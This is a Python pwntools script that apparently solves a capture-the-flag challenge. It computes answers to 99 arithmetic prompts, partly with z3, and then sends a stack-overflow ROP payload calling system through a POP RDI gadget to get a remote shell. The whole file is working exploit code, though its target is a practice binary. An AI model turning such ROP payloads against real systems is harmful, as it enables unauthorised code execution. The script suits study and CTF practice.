from pwn import *
import z3
import ctypes

#p = process("./problems")
#p = gdb.debug("./problems")
p = remote("0.cloud.chals.io", 14011)
e = ELF("./problems")

GOAL = 1337
MAX_INT_MOD = 2147483648
MAX_INT = 4294967295
mask = 0xffffffffffffffff

POP_RDI = 0x000000000040169b
RET = 0x0000000000401016

for i in range(1, 100):
    p.recvuntil(b": ")
    n1 = int(p.recvline().strip().decode())
    p.recvuntil(b": ")
    n2 = int(p.recvline().strip().decode())
    p.recvuntil(b">>> ")

    # Calculate number to send back
    resp = 0
    if i % 10 == 0:
        resp = GOAL - i - n1 + n2
    elif i % 10 == 1:
        resp = i + n1 + n2 - GOAL 
    elif i % 10 == 2:
        resp = GOAL + i - n1 + n2
    elif i % 10 == 3:
        resp = i + n1 - n2 - GOAL
    elif i % 10 == 4:
        resp = n2 + n1 - i - GOAL
    elif i % 10 == 5:
        resp = GOAL - (n1 * n2) - i
    elif i % 10 == 6:
        resp = GOAL - n1 - (n2 * i)
    elif i % 10 == 7:
        solv = z3.Solver()
        x = z3.BitVec(resp, 64)
        solv.add(((x * i + n1 + n2)) == GOAL)
        solv.check()
        solution = solv.model()
        solution = str(solution[x])
        resp = ctypes.c_int(int(solution)).value
    elif i % 10 == 8:
        solv = z3.Solver()
        x = z3.BitVec(resp, 64)
        solv.add(((x + (n1 * n2 * i))) == GOAL)
        solv.check()
        solution = solv.model()
        solution = str(solution[x])
        resp = ctypes.c_int(int(solution)).value
    else:
        resp = GOAL - n1 - n2 - i
    
    print(f"Iteration {i}: {resp}")
    p.sendline(bytes(str(resp).encode()))

# Now we send our exploit
payload = b"A"*8
payload += b"B"*8
payload += p64(RET)
payload += p64(POP_RDI)
payload += p64(e.symbols['shell'])
payload += p64(e.symbols['system'])

p.sendline(payload)
p.interactive()
